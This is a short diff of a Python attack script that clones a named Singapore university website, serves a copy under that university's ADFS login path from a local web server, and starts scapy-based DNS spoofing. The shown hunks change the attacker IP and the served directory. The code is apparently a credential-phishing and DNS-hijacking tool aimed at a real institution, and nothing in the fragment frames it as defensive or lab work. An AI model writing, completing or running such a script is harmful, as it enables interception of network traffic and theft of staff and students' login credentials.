@@ -8,7 +8,7 @@ from threading import Thread
 from scapy.all import *
 
 # Configuration
-attacker_ip = "192.168.2.2"  # Replace with your actual IP address
+attacker_ip = "192.168.2.1"  # Replace with your actual IP address
 target_domain = "xsite.singaporetech.edu.sg"
 cloned_site_dir = "cloned_site"
 
@@ -71,7 +71,7 @@ def dns_spoof(pkt):
 clone_website(f"https://{target_domain}", cloned_site_dir)
 
 # Start the web server in a separate thread
-web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
+web_server_thread = Thread(target=start_web_server, args=(80, "test/fs.singaporetech.edu.sg/adfs/ls"))
 web_server_thread.start()
 
 # Start DNS spoofing
